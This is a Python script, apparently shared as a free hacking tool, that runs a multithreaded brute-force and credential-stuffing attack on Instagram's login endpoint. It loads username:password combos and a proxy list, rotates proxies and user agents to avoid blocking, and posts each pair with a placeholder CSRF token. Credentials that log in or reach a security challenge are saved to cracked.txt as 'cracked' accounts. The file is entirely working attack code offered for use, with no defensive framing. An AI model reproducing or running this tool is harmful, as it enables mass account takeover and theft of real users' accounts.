
import random
import requests, json, sys, time
import threading
from queue import Queue
from colorama import init
from termcolor import colored
init()
# Program By Mexaw Alotebi 

s = ("""
 `.-.`         `...`...::/::::::::--..```          `.
 `.-..     `-/oo+//+osyyyssooo+++++++:..--.`       `.
 `.-.. . `:osyys++yhhhys++/-----://+/--------``    `.
 `.-...-.:+ooo++syhhhhyso+:::::--/////:::-:/::--.  `.
`/---------:-:+osysyyhyo+++oso+/+oo+/++//+ooooo+:---.`
`/....```  .---/o+++so+/:///++/:+so//++++oo+ooo+/:::-``
`/...`   ``.```:/://+/-::---::::/+/:////++++o++/:::..``` `
`-`     .-----+o+++/o+/o+++/++o+ossossooooo++/+//::::-.`.`.
       `-+/:--sssssyhyshyhyyyyysyyhyyyyyysyo+os+sooo+///s+/.
       `-/.` :hyyyhhhhshyhhyyhhyyyyyyhhhysyssyyyyyyysoooyy+:
        ``   /y+o/osyysyyyyyyyyyyyyyysssssyssyysssso+:-:/s+-
             :s+`  `.:/osssssssssssssssssooossso+:.`   -:+/`
             -oo.      `.:+++++++++/-/+oooo++/:.       .:::         MEXAW BRUTE FORCE GOLDEN VERSION # FREE 
  `          `++:          ``.--://:.:////-.`         `.:-.         INSTA  @31421 | TELE @mexaw
  ```         -:/-`             `.:-.-.``           ``.-::
  ``````       `.-----..``````````..----.````` ```.::-:--.          Greetz To Mreshdi | Lord Algnob | Tmim_506 |  And All my friend's
  ``````         .`.::/://::--.``` ```.------.`....:---..
  ``````      ` .```..-.....`..``  `` `......``````.`````
  ` `` `        `````````   ``..`  ``  ```.``
    `           ````````   ``.``.```   ``..``        ``
                 ``  `      `````.````````````
                            `````.```.`  ````
                            `` ````````   `
                            ```` ``` `
                             ``` ```  `  ```
                             ``` ```  `  ``
                             ``` ``      `
                              `       `
                              `      ``
                              ``  `  ``  ``
                                  `   `
""")
print(s)
timeout = int(input("timeout 1-5:"))
numberOFthread = int(input("THREAD:"))
USER_AGENTS = [
    ('Mozilla/5.0 (X11; Linux x86_64) '
     'AppleWebKit/537.36 (KHTML, like Gecko) '
     'Chrome/57.0.2987.110 '
     'Safari/537.36'),  # chrome
    ('Mozilla/5.0 (X11; Linux x86_64) '
     'AppleWebKit/537.36 (KHTML, like Gecko) '
     'Chrome/61.0.3163.79 '
     'Safari/537.36'),  # chrome
    ('Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) '
     'Gecko/20100101 '
     'Firefox/55.0'),  # firefox
    ('Mozilla/5.0 (X11; Linux x86_64) '
     'AppleWebKit/537.36 (KHTML, like Gecko) '
     'Chrome/61.0.3163.91 '
     'Safari/537.36'),  # chrome
    ('Mozilla/5.0 (X11; Linux x86_64) '
     'AppleWebKit/537.36 (KHTML, like Gecko) '
     'Chrome/62.0.3202.89 '
     'Safari/537.36'),  # chrome
    ('Mozilla/5.0 (X11; Linux x86_64) '
     'AppleWebKit/537.36 (KHTML, like Gecko) '
     'Chrome/63.0.3239.108 '
     'Safari/537.36'),  # chrome
]
counter = 0 
def login(q):
    global counter
    try:
        counter+=1
        r = requests.Session()
        url = "https://i.instagram.com/accounts/login/ajax/"
        user_agent = random.choice(USER_AGENTS)
        user = q.split(":")[0]


        password = q.split(":")[1]
        proxy = str(random.choice(cv))
        NewProxies = {
            'http': 'http://{}'.format(proxy),
            'https': 'http://{}'.format(proxy)}
        r.proxies = NewProxies
        r.headers = {'user-agent': user_agent}
        r.headers.update({'Referer': 'https://i.instagram.com/'})
        r.headers.update({'X-CSRFToken': "missing"})
        data = {"username": user, "password": password}
        loginreq = r.post(url, data=data, allow_redirects=True,timeout=timeout).json()

        text = str(loginreq)
        
        if text.find("/challenge") >= 10:
            print("********FUCKED SECURED !**********")
            print("")
            print("Fucked : {}:{} ".format(user, password))
            print("")
            print("********Secureid Unlocked !**********")
            with open("cracked.txt","a") as wr:
                wr.write(user+":"+password+"\n")
        elif text.find("'authenticated': True")>=0 or text.find("'authenticated': true") >=0:
            print("FUCKED {}:{} ".format(user,password))
            with open("cracked.txt","a") as wr:
                wr.write(user+":"+password+"\n")
        


    except KeyboardInterrupt:
        print("\nAborted.\n")
        sys.exit()


    except Exception as e:
        pass
q = Queue()
def threading1():
    while True:
        q_str = str(q.get())

        login(q_str)
        q.task_done()

combo2 = open('combo.txt', 'r').read().splitlines()

print("username list  +  password : ",len(combo2))

xc = open('proxy.txt', 'r').read().splitlines()
cv = []

for i in xc:
    cv.append(i)

for combo in combo2:
    q.put(combo)
threads = []
def printt():
    time.sleep(2.5)
    while True:
        
        print("[+]Counter:{}[+]".format(counter),end="\r")
print("Download Done")
new = threading.Thread(target=printt).start()
for x in range(numberOFthread):
    t = threading.Thread(target=threading1)
    t.daemon = True
    t.start()
    threads.append(t)



q.join()
for i in threads:
    i.join()
new.join()

